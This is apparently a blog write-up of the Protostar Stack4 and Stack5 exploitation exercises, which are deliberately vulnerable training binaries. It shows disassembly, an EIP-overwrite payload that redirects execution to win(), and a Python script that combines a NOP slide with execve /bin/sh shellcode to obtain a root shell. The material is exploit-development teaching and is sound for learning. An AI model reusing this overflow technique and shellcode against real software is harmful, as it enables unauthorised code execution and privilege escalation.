---
layout: post
title:  "Protostar Stack4, Stack5"
date:   2023-04-6 09:00:00 +1100
categories: Journey
tags: 
---

## Stack 4

Code:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

Basic Output:
```bash
user@protostar:/tmp$ /opt/protostar/bin/stack4
TESTINPUTS
```

Disassembly of win and main functions:
```bash
(gdb) disass win
Dump of assembler code for function win:
0x080483f4 <win+0>:     push   ebp
0x080483f5 <win+1>:     mov    ebp,esp
0x080483f7 <win+3>:     sub    esp,0x18
0x080483fa <win+6>:     mov    DWORD PTR [esp],0x80484e0
0x08048401 <win+13>:    call   0x804832c <puts@plt>
0x08048406 <win+18>:    leave
0x08048407 <win+19>:    ret
End of assembler dump.
(gdb)
```

```bash
(gdb) disass main
Dump of assembler code for function main:
0x08048408 <main+0>:    push   ebp
0x08048409 <main+1>:    mov    ebp,esp
0x0804840b <main+3>:    and    esp,0xfffffff0
0x0804840e <main+6>:    sub    esp,0x50
0x08048411 <main+9>:    lea    eax,[esp+0x10]
0x08048415 <main+13>:   mov    DWORD PTR [esp],eax
0x08048418 <main+16>:   call   0x804830c <gets@plt>
0x0804841d <main+21>:   leave
0x0804841e <main+22>:   ret
End of assembler dump.
```

I ran this with input of `AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ` and found that `eip` tried to point to `0x54545454` so now we just need to replace `TTTT` with desired address of `0x080483f4`/`\xf4\x83\x04\x08`.

Python to make overflow string:
```python
buffer = "A"*20
taddr = "\xf4\x83\x04\x08"
print buffer + taddr
```

Output of python file:
```bash
user@protostar:/tmp$ cat stack4
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSï¿½
user@protostar:/tmp$
```

Pipe this into the program, and we have our solution:
```bash
user@protostar:/tmp$ python stack4.py | /opt/protostar/bin/stack4
code flow successfully changed
Segmentation fault
```

## Stack5

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

```bash
(gdb) disass main
Dump of assembler code for function main:
0x080483c4 <main+0>:    push   ebp
0x080483c5 <main+1>:    mov    ebp,esp
0x080483c7 <main+3>:    and    esp,0xfffffff0
0x080483ca <main+6>:    sub    esp,0x50
0x080483cd <main+9>:    lea    eax,[esp+0x10]
0x080483d1 <main+13>:   mov    DWORD PTR [esp],eax
0x080483d4 <main+16>:   call   0x80482e8 <gets@plt>
0x080483d9 <main+21>:   leave
0x080483da <main+22>:   ret
End of assembler dump.
```

Stack flooded with chars:
```
0xbffff7c0:     0x00000000      0xbffff864      0xbffff86c      0xb7fe1848
0xbffff7d0:     0xbffff820      0xffffffff      0xb7ffeff4      0x08048232
0xbffff7e0:     0x00000001      0xbffff820      0xb7ff0626      0xb7fffab0
0xbffff7f0:     0xb7fe1b28      0xb7fd7ff4      0x00000000      0x00000000
0xbffff800:     0xbffff838      0xf5025042      0xdf55a652      0x00000000
0xbffff810:     0x00000000      0x00000000      0x00000001      0x08048310
```

We first pad out the stack where we know that TTTT is where we need the new eip value. We know that we want at least `0xbffff7d0`, however to add tolerance, we pad this by 30, and add a `NOP` slide of 100 long until we hit out payload from `shell-code` which is a 28 byte `/bin/sh` execve shell-code.
```python
import struct
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"
eip = struct.pack("I", 0xbffff7d0+30)
nop = '\x90'*100
payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
print padding + eip + nop + payload
```

Running this with cat for an input shell like below, we have access:
```bash
user@protostar:/tmp$ (cat stack5;cat) | /opt/protostar/bin/stack5
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root
pwd
/tmp
```